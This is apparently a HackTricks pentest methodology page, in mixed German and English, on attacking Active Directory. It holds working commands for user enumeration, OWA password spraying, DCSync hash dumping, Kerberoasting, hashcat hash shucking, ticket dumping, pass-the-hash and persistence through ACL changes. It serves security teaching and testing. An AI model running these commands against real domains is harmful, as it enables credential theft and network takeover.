# Active Directory Methodik

{{#include ../../banners/hacktricks-training.md}}

## Grundlegender Überblick

**Active Directory** dient als grundlegende Technologie, die es **Netzwerkadministratoren** ermöglicht, **Domänen**, **Benutzer** und **Objekte** innerhalb eines Netzwerks effizient zu erstellen und zu verwalten. Es ist so konzipiert, dass es skaliert und eine große Anzahl von Benutzern in verwaltbare **Gruppen** und **Untergruppen** organisiert, während **Zugriffsrechte** auf verschiedenen Ebenen gesteuert werden.

Die Struktur von **Active Directory** besteht aus drei primären Ebenen: **Domänen**, **Trees** und **Forests**. Eine **Domäne** umfasst eine Sammlung von Objekten, wie **Benutzer** oder **Geräte**, die eine gemeinsame Datenbank teilen. **Trees** sind Gruppen dieser Domänen, die durch eine gemeinsame Struktur verbunden sind, und ein **Forest** stellt die Zusammenstellung mehrerer Trees dar, die durch **Vertrauensstellungen** miteinander verbunden sind und die oberste Ebene der Organisationsstruktur bilden. Auf jeder dieser Ebenen können spezifische **Zugriffs-** und **Kommunikationsrechte** festgelegt werden.

Wesentliche Konzepte innerhalb von **Active Directory** umfassen:

1. **Directory** – Beinhaltet alle Informationen zu Active Directory-Objekten.
2. **Object** – Bezeichnet Entitäten im Verzeichnis, einschließlich **Benutzern**, **Gruppen** oder **freigegebenen Ordnern**.
3. **Domain** – Dient als Container für Verzeichnisobjekte; mehrere Domänen können innerhalb eines **Forest** koexistieren, wobei jede ihre eigene Objektkollektion besitzt.
4. **Tree** – Eine Gruppierung von Domänen, die eine gemeinsame Root-Domäne teilen.
5. **Forest** – Die oberste Ebene der Organisationsstruktur in Active Directory, bestehend aus mehreren Trees mit **Vertrauensstellungen** untereinander.

**Active Directory Domain Services (AD DS)** umfasst eine Reihe von Diensten, die für die zentrale Verwaltung und Kommunikation in einem Netzwerk wichtig sind. Diese Dienste umfassen:

1. **Domain Services** – Zentralisiert die Datenspeicherung und verwaltet die Interaktionen zwischen **Benutzern** und **Domänen**, einschließlich **Authentifizierung** und Suchfunktionen.
2. **Certificate Services** – Beaufsichtigt die Erstellung, Verteilung und Verwaltung sicherer **digitaler Zertifikate**.
3. **Lightweight Directory Services** – Unterstützt directory-fähige Anwendungen über das **LDAP-Protokoll**.
4. **Directory Federation Services** – Bietet **Single-Sign-On**-Funktionen, um Benutzer über mehrere Webanwendungen in einer einzigen Sitzung zu authentifizieren.
5. **Rights Management** – Hilft beim Schutz urheberrechtlich geschützten Materials, indem es dessen unautorisierte Verbreitung und Nutzung regelt.
6. **DNS Service** – Wichtig für die Auflösung von **Domainnamen**.

Für eine detailliertere Erklärung siehe: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Um zu lernen, wie man ein AD angreift, musst du den **Kerberos-Authentifizierungsprozess** wirklich gut verstehen.  
[**Lies diese Seite, wenn du noch nicht weißt, wie es funktioniert.**](kerberos-authentication.md)

## Spickzettel

Du kannst viel von [https://wadcoms.github.io/](https://wadcoms.github.io) nutzen, um schnell einen Überblick zu bekommen, welche Befehle du ausführen kannst, um ein AD zu enumerieren/auszunutzen.

> [!WARNING]
> Kerberos-Kommunikation **erfordert einen vollqualifizierten Namen (FQDN)**, um Aktionen auszuführen. Wenn du versuchst, auf eine Maschine über die IP-Adresse zuzugreifen, **wird NTLM statt Kerberos verwendet**.

## Recon Active Directory (No creds/sessions)

Wenn du nur Zugang zu einer AD-Umgebung hast, aber keine Anmeldeinformationen/Sessions, könntest du:

- **Pentest the network:**
- Scanne das Netzwerk, finde Maschinen und offene Ports und versuche, **Schwachstellen auszunutzen** oder **Anmeldeinformationen** daraus zu extrahieren (zum Beispiel könnten [printers could be very interesting targets](ad-information-in-printers.md) sehr interessante Ziele sein).
- DNS-Enumeration kann Informationen über wichtige Server in der Domäne liefern, wie Web, Drucker, Shares, VPN, Media usw.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Schau dir die allgemeine [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) an, um mehr Informationen darüber zu finden, wie man das macht.
- **Check for null and Guest access on smb services** (dies funktioniert nicht bei modernen Windows-Versionen):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Eine detailliertere Anleitung, wie man einen SMB-Server enumeriert, findest du hier:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Eine detailliertere Anleitung, wie man LDAP enumeriert, findest du hier (achte **besonders auf den anonymen Zugriff**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Sammle Anmeldeinformationen [**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Greife Hosts an, indem du die [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) verwendest
- Sammle Anmeldeinformationen, indem du [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856) exponierst
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Extrahiere Benutzernamen/Namen aus internen Dokumenten, Social Media, Diensten (hauptsächlich Web) innerhalb der Domänenumgebungen sowie aus öffentlich verfügbaren Quellen.
- Wenn du die vollständigen Namen von Firmenmitarbeitern findest, kannst du verschiedene AD **username conventions** ausprobieren ([**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Die häufigsten Konventionen sind: _NameSurname_, _Name.Surname_, _NamSur_ (3 Buchstaben von jedem), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _zufällige Buchstaben und 3 zufällige Zahlen_ (abc123).
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Benutzeraufzählung

- **Anonymous SMB/LDAP enum:** Siehe die Seiten zu [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) und [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Wenn ein **ungültiger Benutzername angefragt wird**, antwortet der Server mit dem **Kerberos-Fehlercode** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, was es uns erlaubt zu bestimmen, dass der Benutzername ungültig ist. **Gültige Benutzernamen** führen entweder zur Ausgabe des **TGT in einer AS-REP**-Antwort oder zum Fehler _KRB5KDC_ERR_PREAUTH_REQUIRED_, was anzeigt, dass der Benutzer Pre-Authentication durchführen muss.
- **No Authentication against MS-NRPC**: Verwendung von auth-level = 1 (No authentication) gegen die MS-NRPC (Netlogon)-Schnittstelle auf Domain Controllern. Die Methode ruft die Funktion `DsrGetDcNameEx2` auf, nachdem die MS-NRPC-Schnittstelle gebunden wurde, um zu prüfen, ob der Benutzer oder Computer ohne jegliche Anmeldeinformationen existiert. Das Tool [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementiert diese Art der Enumeration. Die Forschung dazu ist [hier](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf) zu finden.
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Wenn Sie einen dieser Server im Netzwerk gefunden haben, können Sie außerdem **user enumeration** dagegen durchführen. Zum Beispiel könnten Sie das Tool [**MailSniper**](https://github.com/dafthack/MailSniper) verwenden:
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> You can find lists of usernames in [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  and this one ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> However, you should have the **name of the people working on the company** from the recon step you should have performed before this. With the name and surname you could used the script [**namemash.py**](https://gist.github.com/superkojiman/11076951) to generate potential valid usernames.

### Knowing one or several usernames

Ok, so you know you have already a valid username but no passwords... Then try:

- [**ASREPRoast**](asreproast.md): Wenn ein Benutzer **nicht** das Attribut _DONT_REQ_PREAUTH_ hat, kannst du **eine AS_REP-Nachricht anfordern** für diesen Benutzer, die einige Daten enthält, die mit einer Ableitung des Passworts des Benutzers verschlüsselt sind.
- [**Password Spraying**](password-spraying.md): Versuche die **häufigsten Passwörter** bei jedem der entdeckten Benutzer, vielleicht verwendet irgendein Benutzer ein schlechtes Passwort (beachte die Passwort-Richtlinie!).
- Note that you can also **spray OWA servers** to try to get access to the users mail servers.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

You might be able to **obtain** some challenge **hashes** to crack **poisoning** some protocols of the **network**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

If you have managed to enumerate the active directory you will have **more emails and a better understanding of the network**. You might be able to to force NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)  to get access to the AD env.

### Steal NTLM Creds

If you can **access other PCs or shares** with the **null or guest user** you could **place files** (like a SCF file) that if somehow accessed will t**rigger an NTLM authentication against you** so you can **steal** the **NTLM challenge** to crack it:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** behandelt jeden NT-Hash, den du bereits besitzt, als Kandidatenpasswort für andere, langsamere Formate, deren Schlüsselmaterial direkt aus dem NT-Hash abgeleitet wird. Anstatt lange Passphrasen in Kerberos RC4-Tickets, NetNTLM-Challenges oder gecachten Credentials zu brute-forcen, fütterst du die NT-Hashes in Hashcats NT-candidate-Modi und lässt diese Password-Reuse validieren, ohne je den Klartext zu erfahren. Das ist besonders mächtig nach einer Domain-Kompromittierung, wenn du tausende aktuelle und historische NT-Hashes ernten kannst.

Use shucking when:

- You have an NT corpus from DCSync, SAM/SECURITY dumps, or credential vaults and need to test for reuse in other domains/forests.
- You capture RC4-based Kerberos material (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses, or DCC/DCC2 blobs.
- You want to quickly prove reuse for long, uncrackable passphrases and immediately pivot via Pass-the-Hash.

The technique **does not work** against encryption types whose keys are not the NT hash (e.g., Kerberos etype 17/18 AES). If a domain enforces AES-only, you must revert to the regular password modes.

#### Building an NT hash corpus

- **DCSync/NTDS** – Use `secretsdump.py` with history to grab the largest possible set of NT hashes (and their previous values):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History entries dramatically widen the candidate pool because Microsoft can store up to 24 previous hashes per account. For more ways to harvest NTDS secrets see:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (or Mimikatz `lsadump::sam /patch`) extracts local SAM/SECURITY data and cached domain logons (DCC/DCC2). Deduplicate and append those hashes to the same `nt_candidates.txt` list.
- **Track metadata** – Keep the username/domain that produced each hash (even if the wordlist contains only hex). Matching hashes tell you immediately which principal is reusing a password once Hashcat prints the winning candidate.
- Prefer candidates from the same forest or a trusted forest; that maximizes the chance of overlap when shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- NT-candidate inputs **must remain raw 32-hex NT hashes**. Disable rule engines (no `-r`, no hybrid modes) because mangling corrupts the candidate key material.
- These modes are not inherently faster, but the NTLM keyspace (~30,000 MH/s on an M3 Max) is ~100× quicker than Kerberos RC4 (~300 MH/s). Testing a curated NT list is far cheaper than exploring the entire password space in the slow format.
- Always run the **latest Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) because modes 31500/31600/35300/35400 shipped recently.
- There is currently no NT mode for AS-REQ Pre-Auth, and AES etypes (19600/19700) require the plaintext password because their keys are derived via PBKDF2 from UTF-16LE passwords, not raw NT hashes.

#### Example – Kerberoast RC4 (mode 35300)

1. Capture an RC4 TGS for a target SPN with a low-privileged user (see the Kerberoast page for details):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck the ticket with your NT list:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat derives the RC4 key from each NT candidate and validates the `$krb5tgs$23$...` blob. A match confirms that the service account uses one of your existing NT hashes.

3. Immediately pivot via PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

You can optionally recover the plaintext later with `hashcat -m 1000 <matched_hash> wordlists/` if needed.

#### Example – Cached credentials (mode 31600)

1. Dump cached logons from a compromised workstation:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copy the DCC2 line for the interesting domain user into `dcc2_highpriv.txt` and shuck it:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. A successful match yields the NT hash already known in your list, proving that the cached user is reusing a password. Use it directly for PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) or brute-force it in fast NTLM mode to recover the string.

The exact same workflow applies to NetNTLM challenge-responses (`-m 27000/27100`) and DCC (`-m 31500`). Once a match is identified you can launch relay, SMB/WMI/WinRM PtH, or re-crack the NT hash with masks/rules offline.



## Enumerating Active Directory WITH credentials/session

For this phase you need to have **compromised the credentials or a session of a valid domain account.** If you have some valid credentials or a shell as a domain user, **you should remember that the options given before are still options to compromise other users**.

Before start the authenticated enumeration you should know what is the **Kerberos double hop problem.**


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Having compromised an account is a **big step to start compromising the whole domain**, because you are going to be able to start the **Active Directory Enumeration:**

Regarding [**ASREPRoast**](asreproast.md) you can now find every possible vulnerable user, and regarding [**Password Spraying**](password-spraying.md) you can get a **list of all the usernames** and try the password of the compromised account, empty passwords and new promising passwords.

- You could use the [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- You can also use [**powershell for recon**](../basic-powershell-for-pentesters/index.html) which will be stealthier
- You can also [**use powerview**](../basic-powershell-for-pentesters/powerview.md) to extract more detailed information
- Another amazing tool for recon in an active directory is [**BloodHound**](bloodhound.md). It is **not very stealthy** (depending on the collection methods you use), but **if you don't care** about that, you should totally give it a try. Find where users can RDP, find path to other groups, etc.
- **Other automated AD enumeration tools are:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) as they might contain interesting information.
- A **tool with GUI** that you can use to enumerate the directory is **AdExplorer.exe** from **SysInternal** Suite.
- You can also search in the LDAP database with **ldapsearch** to look for credentials in fields _userPassword_ & _unixUserPassword_, or even for _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) for other methods.
- If you are using **Linux**, you could also enumerate the domain using [**pywerview**](https://github.com/the-useless-one/pywerview).
- You could also try automated tools as:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

It's very easy to obtain all the domain usernames from Windows (`net user /domain` ,`Get-DomainUser` or `wmic useraccount get name,sid`). In Linux, you can use: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` or `enum4linux -a -u "user" -p "password" <DC IP>`

> Even if this Enumeration section looks small this is the most important part of all. Access the links (mainly the one of cmd, powershell, powerview and BloodHound), learn how to enumerate a domain and practice until you feel comfortable. During an assessment, this will be the key moment to find your way to DA or to decide that nothing can be done.

### Kerberoast

Kerberoasting involves obtaining **TGS tickets** used by services tied to user accounts and cracking their encryption—which is based on user passwords—**offline**.

More about this in:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Once you have obtained some credentials you could check if you have access to any **machine**. For that matter, you could use **CrackMapExec** to attempt connecting on several servers with different protocols, accordingly to your ports scans.

### Local Privilege Escalation

If you have compromised credentials or a session as a regular domain user and you have **access** with this user to **any machine in the domain** you should try to find your way to **escalate privileges locally and looting for credentials**. This is because only with local administrator privileges you will be able to **dump hashes of other users** in memory (LSASS) and locally (SAM).

There is a complete page in this book about [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) and a [**checklist**](../checklist-windows-privilege-escalation.md). Also, don't forget to use [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

It's very **unlikely** that you will find **tickets** in the current user **giving you permission to access** unexpected resources, but you could check:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Wenn du es geschafft hast, das active directory zu enumerieren, wirst du **more emails and a better understanding of the network** haben. Du könntest in der Lage sein, NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Suche nach Creds in Computer Shares | SMB Shares

Now that you have some basic credentials you should check if you can **find** any **interesting files being shared inside the AD**. Du könntest das manuell machen, aber das ist eine sehr langweilige, sich wiederholende Aufgabe (und noch mehr, wenn du Hunderte von Docs findest, die du prüfen musst).

[**Follow this link to learn about tools you could use.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Wenn du auf **andere PCs oder shares zugreifen** kannst, könntest du **Dateien platzieren** (wie eine SCF file), die bei einem Zugriff eine NTLM-Authentifizierung gegen dich auslösen würden, sodass du **die NTLM challenge** **stehlen** kannst, um sie zu cracken:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Diese Schwachstelle erlaubte es jedem authentifizierten Benutzer, den **domain controller zu kompromittieren**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**Für die folgenden Techniken reicht ein normaler Domain-Benutzer nicht aus, du brauchst spezielle Privilegien/Credentials, um diese Angriffe durchzuführen.**

### Hash extraction

Hoffentlich ist es dir gelungen, ein **lokales Admin**-Konto zu kompromittieren, mithilfe von [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) einschließlich relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).  
Dann ist es Zeit, alle Hashes aus dem Speicher und lokal zu dumpen.  
[**Read this page about different ways to obtain the hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Once you have the hash of a user**, you can use it to **impersonate** it.  
Du musst ein **tool** verwenden, das die **NTLM authentication using** diesen **hash** durchführt, **or** du könntest ein neues **sessionlogon** erstellen und diesen **hash** in den **LSASS** injizieren, sodass bei jeder **NTLM authentication** dieser **hash verwendet wird.** Die letzte Option ist, was mimikatz macht.  
[**Read this page for more information.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Dieser Angriff zielt darauf ab, **use the user NTLM hash to request Kerberos tickets**, als Alternative zum üblichen Pass The Hash über das NTLM-Protokoll. Daher kann dies besonders **useful in networks where NTLM protocol is disabled** und nur **Kerberos is allowed** als Authentifizierungsprotokoll nützlich sein.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Bei der **Pass The Ticket (PTT)** Angriffsmethode stehlen Angreifer **ein Authentifizierungsticket eines Benutzers** anstelle dessen Passworts oder Hash-Werte. Dieses gestohlene Ticket wird dann verwendet, um sich als den Benutzer auszugeben und unautorisierten Zugriff auf Ressourcen und Dienste im Netzwerk zu erhalten.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Wenn du den **hash** oder das **password** eines **lokalen Administrators** hast, solltest du versuchen, dich damit lokal auf anderen **PCs** anzumelden.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Beachte, dass dies ziemlich **auffällig** ist und **LAPS** dies **mildern** würde.

### MSSQL Abuse & Trusted Links

Wenn ein Benutzer Berechtigungen hat, **auf MSSQL-Instanzen zuzugreifen**, könnte er diese nutzen, um **Befehle auf dem MSSQL-Host auszuführen** (wenn dieser als SA läuft), den NetNTLM **hash** zu **stehlen** oder sogar einen **relay** **attack** durchzuführen.\
Außerdem, wenn eine MSSQL-Instanz von einer anderen MSSQL-Instanz vertraut wird (database link). Wenn der Benutzer Rechte auf der vertrauenswürdigen Datenbank hat, kann er **die Vertrauensbeziehung nutzen, um auch in der anderen Instanz Abfragen auszuführen**. Diese Vertrauensstellungen können verkettet werden und irgendwann könnte der Benutzer eine falsch konfigurierte Datenbank finden, in der er Befehle ausführen kann.\
**Die Links zwischen Datenbanken funktionieren sogar über Forest trusts hinweg.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Drittanbieter-Inventar- und Deployment-Suiten bieten oft mächtige Pfade zu Credentials und Codeausführung. Siehe:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Wenn du ein Computerobjekt mit dem Attribut [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) findest und du Domain-Berechtigungen auf dem Computer hast, kannst du die TGTs aus dem Speicher aller Benutzer dumpen, die sich auf dem Computer einloggen.\
Wenn sich also ein **Domain Admin auf dem Computer anmeldet**, kannst du seinen TGT dumpen und ihn mittels [Pass the Ticket](pass-the-ticket.md) impersonifizieren.\
Dank constrained delegation könntest du sogar **automatisch einen Print Server kompromittieren** (hoffentlich ist es ein DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Wenn einem Benutzer oder Computer "Constrained Delegation" erlaubt ist, kann er **jeden Benutzer impersonifizieren, um auf bestimmte Services eines Computers zuzugreifen**.\
Wenn du dann den **hash** dieses Benutzers/Computers kompromittierst, kannst du **jeden Benutzer impersonifizieren** (sogar Domain Admins), um auf diese Services zuzugreifen.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Schreibrechte (WRITE) auf ein Active Directory-Objekt eines entfernten Computers erlauben die Erlangung von Codeausführung mit **erhöhten Rechten**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

Der kompromittierte Benutzer könnte einige **interessante Rechte über bestimmte Domain-Objekte** besitzen, die es dir ermöglichen, später lateral zu **bewegen**/**Privilegien zu eskalieren**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Das Entdecken eines **Spool-Dienstes, der innerhalb der Domain lauscht**, kann **missbraucht** werden, um **neue Credentials zu erlangen** und **Privilegien zu eskalieren**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

Wenn **andere Benutzer** auf die **kompromittierte** Maschine **zugreifen**, ist es möglich, **Credentials aus dem Speicher zu sammeln** und sogar **Beacons in deren Prozesse zu injizieren**, um sie zu impersonifizieren.\
Normalerweise melden sich Benutzer über RDP am System an, hier findest du, wie man ein paar Angriffe auf Drittanbieter-RDP-Sessions durchführt:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** stellt ein System zur Verwaltung des **lokalen Administratorpassworts** auf domain-gebundenen Computern bereit, das sicherstellt, dass es **zufällig**, einzigartig und häufig **geändert** wird. Diese Passwörter werden in Active Directory gespeichert und der Zugriff wird über ACLs nur für autorisierte Benutzer kontrolliert. Mit ausreichenden Rechten, um auf diese Passwörter zuzugreifen, wird das Pivoting zu anderen Computern möglich.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

Das **Sammeln von Zertifikaten** von der kompromittierten Maschine kann ein Weg sein, um Privilegien innerhalb der Umgebung zu eskalieren:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Wenn **verwundbare Templates** konfiguriert sind, ist es möglich, diese zum Eskalieren von Privilegien zu missbrauchen:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Sobald du **Domain Admin** oder noch besser **Enterprise Admin** Rechte erlangt hast, kannst du die **Domain-Datenbank** dumpen: _ntds.dit_.

[**Mehr Informationen zum DCSync-Angriff findest du hier**](dcsync.md).

[**Mehr Informationen darüber, wie man NTDS.dit stiehlt, findest du hier**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Einige der zuvor besprochenen Techniken können für Persistence genutzt werden.\
Zum Beispiel könntest du:

- Benutzer für [**Kerberoast**](kerberoast.md) verwundbar machen

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Benutzer für [**ASREPRoast**](asreproast.md) verwundbar machen

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- [**DCSync**](#dcsync) Rechte an einen Benutzer gewähren

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

Der **Silver Ticket attack** erstellt ein **legitimes Ticket Granting Service (TGS) ticket** für einen bestimmten Dienst, indem der **NTLM hash** verwendet wird (zum Beispiel der **hash des PC-Kontos**). Diese Methode wird eingesetzt, um **Zugriff auf die Service-Privilegien** zu erlangen.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Ein **Golden Ticket attack** beinhaltet, dass ein Angreifer Zugriff auf den **NTLM hash des krbtgt-Accounts** in einer Active Directory-Umgebung gewinnt. Dieses Konto ist speziell, weil es zur Signierung aller **Ticket Granting Tickets (TGTs)** verwendet wird, die für die Authentifizierung im AD-Netzwerk essentiell sind.

Sobald der Angreifer diesen Hash erlangt hat, kann er **TGTs** für beliebige Konten erzeugen (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Diese sind wie Golden Tickets, aber so gefälscht, dass sie **gängige Erkennungsmechanismen für Golden Tickets umgehen.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Zertifikate eines Kontos zu besitzen oder in der Lage zu sein, diese anzufordern**, ist eine sehr gute Methode, um in einem Benutzerkonto persistent zu bleiben (selbst wenn dieser das Passwort ändert):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Mit Zertifikaten kann man auch mit hohen Rechten innerhalb der Domain persistent bleiben:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

